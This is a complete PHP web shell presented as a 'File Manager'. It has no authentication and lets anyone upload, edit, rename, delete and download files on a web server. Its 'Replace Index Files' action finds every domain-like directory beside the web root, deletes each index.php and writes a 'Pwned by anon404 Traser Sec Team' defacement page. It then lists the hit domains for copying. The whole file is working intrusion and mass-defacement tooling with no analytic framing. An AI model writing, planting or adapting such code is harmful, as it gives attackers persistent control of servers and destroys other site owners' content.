<?php
session_start();
error_reporting(0);

class FileManager {
    private $currentDir;
    private $rootDir;
    
    public function __construct() {
        $this->rootDir = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
        $this->currentDir = isset($_GET['dir']) ? realpath($this->rootDir . '/' . $_GET['dir']) : $this->rootDir;
        if (!$this->currentDir || strpos($this->currentDir, $this->rootDir) !== 0) {
            $this->currentDir = $this->rootDir;
        }
    }
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $action = $_POST['action'] ?? '';
            
            switch ($action) {
                case 'upload':
                    return $this->uploadFile();
                case 'delete':
                    return $this->deleteFile($_POST['file']);
                case 'rename':
                    return $this->renameFile($_POST['oldname'], $_POST['newname']);
                case 'edit':
                    return $this->saveFile($_POST['filename'], $_POST['content']);
                case 'mkdir':
                    return $this->createDirectory($_POST['dirname']);
                case 'replace_index':
                    return $this->replaceIndexFiles();
            }
        }
        
        if (isset($_GET['download'])) {
            $this->downloadFile($_GET['download']);
        }
        
        if (isset($_GET['edit'])) {
            return $this->getFileContent($_GET['edit']);
        }
        
        return false;
    }
    
    private function uploadFile() {
        if (!isset($_FILES['file'])) return ['error' => 'No file uploaded'];
        
        $targetFile = $this->currentDir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return ['success' => 'File uploaded successfully'];
        }
        return ['error' => 'Upload failed'];
    }
    
    private function deleteFile($file) {
        $filePath = $this->currentDir . '/' . $file;
        if (is_dir($filePath)) {
            $this->deleteDirectory($filePath);
        } else {
            unlink($filePath);
        }
        return ['success' => 'File deleted successfully'];
    }
    
    private function deleteDirectory($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $filePath = $dir . '/' . $file;
            is_dir($filePath) ? $this->deleteDirectory($filePath) : unlink($filePath);
        }
        rmdir($dir);
    }
    
    private function renameFile($oldname, $newname) {
        $oldPath = $this->currentDir . '/' . $oldname;
        $newPath = $this->currentDir . '/' . $newname;
        if (rename($oldPath, $newPath)) {
            return ['success' => 'File renamed successfully'];
        }
        return ['error' => 'Rename failed'];
    }
    
    private function saveFile($filename, $content) {
        $filePath = $this->currentDir . '/' . $filename;
        if (file_put_contents($filePath, $content) !== false) {
            return ['success' => 'File saved successfully'];
        }
        return ['error' => 'Save failed'];
    }
    
    private function createDirectory($dirname) {
        $dirPath = $this->currentDir . '/' . $dirname;
        if (mkdir($dirPath, 0755)) {
            return ['success' => 'Directory created successfully'];
        }
        return ['error' => 'Directory creation failed'];
    }
    
    private function downloadFile($file) {
        $filePath = $this->currentDir . '/' . $file;
        if (file_exists($filePath) && is_file($filePath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        }
    }
    
    private function getFileContent($file) {
        $filePath = $this->currentDir . '/' . $file;
        if (file_exists($filePath) && is_file($filePath)) {
            return file_get_contents($filePath);
        }
        return false;
    }
    
    private function replaceIndexFiles() {
        $domainDirs = $this->findDomainDirectories();
        $replaced = 0;
        $domainList = [];
        $indexContent = '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Website Touch by anon404">
    <meta name="keywords" content="touch, anon404, security, penetration">
    <meta name="author" content="anon404 Traser Sec Team">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#000000">
    <meta property="og:title" content="touch By anon404">
    <meta property="og:description" content="Website compromised by anon404 Traser Sec Team">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="touch By anon404">
    <title>Pwned by anon404</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: "Arial", sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .owned-text {
            text-align: center;
            line-height: 1.6;
        }
        
        .main-title {
            font-size: 3.5rem;
            font-weight: bold;
            margin-bottom: 30px;
            color: #fff;
        }
        
        .team-name {
            font-size: 2rem;
            color: #fff;
            font-weight: normal;
        }
        
        .question {
            color: #ccc;
            font-size: 2rem;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="owned-text">
        <div class="main-title">touch By</div>
        <div class="team-name">
            <span class="question">?</span>
            anon404 Traser Sec Team
        </div>
    </div>
</body>
</html>';
        
        foreach ($domainDirs as $dir) {
            $indexPath = $dir . '/index.php';
            $domainName = basename($dir);
            
            if (file_exists($indexPath)) {
                unlink($indexPath);
            }
            file_put_contents($indexPath, $indexContent);
            $replaced++;
            $domainList[] = $domainName;
        }
        
        return [
            'success' => "Replaced index.php in {$replaced} domain directories",
            'domains' => $domainList,
            'replaced' => $replaced
        ];
    }
    
    private function findDomainDirectories() {
        $dirs = [];
        $parentDir = dirname($this->rootDir);
        
        if (is_dir($parentDir)) {
            $items = scandir($parentDir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $itemPath = $parentDir . '/' . $item;
                if (is_dir($itemPath) && $this->isDomainLike($item)) {
                    $dirs[] = $itemPath;
                }
            }
        }
        
        return $dirs;
    }
    
    private function isDomainLike($dirname) {
        return preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname) || 
               preg_match('/^[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname);
    }
    
    public function getFiles() {
        $files = [];
        $items = scandir($this->currentDir);
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $itemPath = $this->currentDir . '/' . $item;
            $files[] = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'directory' : 'file',
                'size' => is_file($itemPath) ? filesize($itemPath) : 0,
                'modified' => filemtime($itemPath),
                'permissions' => substr(sprintf('%o', fileperms($itemPath)), -4)
            ];
        }
        
        usort($files, function($a, $b) {
            if ($a['type'] !== $b['type']) {
                return $a['type'] === 'directory' ? -1 : 1;
            }
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $files;
    }
    
    public function getCurrentPath() {
        return str_replace($this->rootDir, '', $this->currentDir);
    }
    
    public function getParentPath() {
        $parent = dirname($this->currentDir);
        if ($parent !== $this->rootDir && strpos($parent, $this->rootDir) === 0) {
            return str_replace($this->rootDir, '', $parent);
        }
        return '';
    }
}

$fm = new FileManager();
$response = $fm->handleRequest();
$editContent = '';

if (isset($_GET['edit'])) {
    $editContent = $fm->getFileContent($_GET['edit']);
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #e4e4e7;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .header h1 {
            color: #8b5cf6;
            font-size: 2.5rem;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .breadcrumb {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-family: monospace;
            border: 1px solid #374151;
        }
        
        .actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .action-group {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .action-group h3 {
            margin-bottom: 15px;
            color: #8b5cf6;
        }
        
        .btn {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            width: 100%;
            margin-bottom: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
        }
        
        .btn-danger:hover {
            box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
        }
        
        input[type="text"], input[type="file"], textarea {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #374151;
            color: #e4e4e7;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            margin-bottom: 10px;
        }
        
        input[type="text"]:focus, textarea:focus {
            outline: none;
            border-color: #8b5cf6;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
        }
        
        .file-list {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .file-item {
            display: grid;
            grid-template-columns: auto 1fr auto auto auto auto;
            gap: 15px;
            padding: 15px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            align-items: center;
            transition: background 0.3s ease;
        }
        
        .file-item:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .file-icon {
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #8b5cf6;
        }
        
        .file-name {
            font-weight: 500;
        }
        
        .file-name a {
            color: #e4e4e7;
            text-decoration: none;
        }
        
        .file-name a:hover {
            color: #8b5cf6;
        }
        
        .file-size, .file-date, .file-perms {
            font-size: 0.9rem;
            color: #9ca3af;
        }
        
        .file-actions {
            display: flex;
            gap: 5px;
        }
        
        .btn-small {
            padding: 5px 10px;
            font-size: 12px;
            margin: 0;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
        }
        
        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1f2937;
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .modal h3 {
            margin-bottom: 20px;
            color: #8b5cf6;
        }
        
        .close {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 24px;
            cursor: pointer;
            color: #9ca3af;
        }
        
        .close:hover {
            color: #e4e4e7;
        }
        
        textarea {
            height: 400px;
            font-family: 'Courier New', monospace;
            resize: vertical;
        }
        
        .alert {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .alert-success {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid #22c55e;
            color: #22c55e;
        }
        
        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            color: #ef4444;
        }
        
        @media (max-width: 768px) {
            .file-item {
                grid-template-columns: auto 1fr auto;
                gap: 10px;
            }
            
            .file-size, .file-date, .file-perms {
                display: none;
            }
            
            .actions {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>File Manager</h1>
        </div>
        
        <?php if ($response): ?>
            <div class="alert <?= isset($response['error']) ? 'alert-error' : 'alert-success' ?>">
                <?= $response['error'] ?? $response['success'] ?>
                
                <?php if (isset($response['domains']) && !empty($response['domains'])): ?>
                    <div style="margin-top: 15px;">
                        <h4 style="color: #8b5cf6; margin-bottom: 10px;">Domain yang berhasil diproses:</h4>
                        <div id="domainList" style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 8px; margin-bottom: 10px;">
                            <?php foreach ($response['domains'] as $domain): ?>
                                <div style="margin-bottom: 5px;">✓ https://<?= htmlspecialchars($domain) ?></div>
                            <?php endforeach; ?>
                        </div>
                        <button onclick="copyDomains()" class="btn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); width: auto; margin: 0;">
                            📋 Salin Semua Domain
                        </button>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <div class="breadcrumb">
            <strong>Current Path:</strong> <?= $fm->getCurrentPath() ?: '/' ?>
        </div>
        
        <div class="actions">
            <div class="action-group">
                <h3>Upload File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <input type="file" name="file" required>
                    <button type="submit" class="btn">Upload</button>
                </form>
            </div>
            
            <div class="action-group">
                <h3>Create Directory</h3>
                <form method="post">
                    <input type="hidden" name="action" value="mkdir">
                    <input type="text" name="dirname" placeholder="Directory name" required>
                    <button type="submit" class="btn">Create</button>
                </form>
            </div>
            
            <div class="action-group">
                <h3>Domain Actions</h3>
                <form method="post" onsubmit="return confirm('Replace index.php in all domain directories?')">
                    <input type="hidden" name="action" value="replace_index">
                    <button type="submit" class="btn btn-danger">Replace Index Files</button>
                </form>
            </div>
        </div>
        
        <div class="file-list">
            <?php if ($fm->getParentPath() !== false): ?>
                <div class="file-item">
                    <div class="file-icon">📁</div>
                    <div class="file-name">
                        <a href="?dir=<?= urlencode($fm->getParentPath()) ?>">..</a>
                    </div>
                    <div class="file-size">-</div>
                    <div class="file-date">-</div>
                    <div class="file-perms">-</div>
                    <div class="file-actions"></div>
                </div>
            <?php endif; ?>
            
            <?php foreach ($fm->getFiles() as $file): ?>
                <div class="file-item">
                    <div class="file-icon">
                        <?= $file['type'] === 'directory' ? '📁' : '📄' ?>
                    </div>
                    <div class="file-name">
                        <?php if ($file['type'] === 'directory'): ?>
                            <a href="?dir=<?= urlencode($fm->getCurrentPath() . '/' . $file['name']) ?>">
                                <?= htmlspecialchars($file['name']) ?>
                            </a>
                        <?php else: ?>
                            <?= htmlspecialchars($file['name']) ?>
                        <?php endif; ?>
                    </div>
                    <div class="file-size">
                        <?= $file['type'] === 'file' ? number_format($file['size']) . ' B' : '-' ?>
                    </div>
                    <div class="file-date">
                        <?= date('Y-m-d H:i', $file['modified']) ?>
                    </div>
                    <div class="file-perms">
                        <?= $file['permissions'] ?>
                    </div>
                    <div class="file-actions">
                        <?php if ($file['type'] === 'file'): ?>
                            <button class="btn btn-small" onclick="editFile('<?= htmlspecialchars($file['name']) ?>')">Edit</button>
                            <a href="?download=<?= urlencode($file['name']) ?>&dir=<?= urlencode($fm->getCurrentPath()) ?>" class="btn btn-small">Download</a>
                        <?php endif; ?>
                        <button class="btn btn-small" onclick="renameFile('<?= htmlspecialchars($file['name']) ?>')">Rename</button>
                        <button class="btn btn-small btn-danger" onclick="deleteFile('<?= htmlspecialchars($file['name']) ?>')">Delete</button>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
    
    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h3>Edit File</h3>
            <form method="post">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="filename" id="editFilename">
                <textarea name="content" id="editContent" placeholder="File content..."></textarea>
                <button type="submit" class="btn">Save</button>
            </form>
        </div>
    </div>
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h3>Rename File</h3>
            <form method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="oldname" id="renameOldname">
                <input type="text" name="newname" id="renameNewname" placeholder="New name" required>
                <button type="submit" class="btn">Rename</button>
            </form>
        </div>
    </div>
    
    <script>
        function editFile(filename) {
            document.getElementById('editFilename').value = filename;
            fetch(`?edit=${encodeURIComponent(filename)}&dir=<?= urlencode($fm->getCurrentPath()) ?>`)
                .then(response => response.text())
                .then(content => {
                    document.getElementById('editContent').value = content;
                    document.getElementById('editModal').style.display = 'block';
                });
        }
        
        function renameFile(filename) {
            document.getElementById('renameOldname').value = filename;
            document.getElementById('renameNewname').value = filename;
            document.getElementById('renameModal').style.display = 'block';
        }
        
        function deleteFile(filename) {
            if (confirm(`Are you sure you want to delete "${filename}"?`)) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = `
                    <input type="hidden" name="action" value="delete">
                    <input type="hidden" name="file" value="${filename}">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function closeModal() {
            document.querySelectorAll('.modal').forEach(modal => {
                modal.style.display = 'none';
            });
        }
        
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                closeModal();
            }
        }
        
        function copyDomains() {
            const domainList = document.getElementById('domainList');
            const domains = [];
            domainList.querySelectorAll('div').forEach(div => {
                if (div.textContent.includes('https://')) {
                    const cleanDomain = div.textContent.replace('✓ ', '').trim();
                    domains.push(cleanDomain);
                }
            });
            
            const domainText = domains.join('\n');
            navigator.clipboard.writeText(domainText).then(() => {
                alert('Domain berhasil disalin ke clipboard!');
            }).catch(() => {
                // Fallback untuk browser lama
                const textArea = document.createElement('textarea');
                textArea.value = domainText;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                alert('Domain berhasil disalin ke clipboard!');
            });
        }

        <?php if (isset($_GET['edit'])): ?>
            document.getElementById('editFilename').value = '<?= htmlspecialchars($_GET['edit']) ?>';
            document.getElementById('editContent').value = <?= json_encode($editContent) ?>;
            document.getElementById('editModal').style.display = 'block';
        <?php endif; ?>
    </script>
</body>
</html>
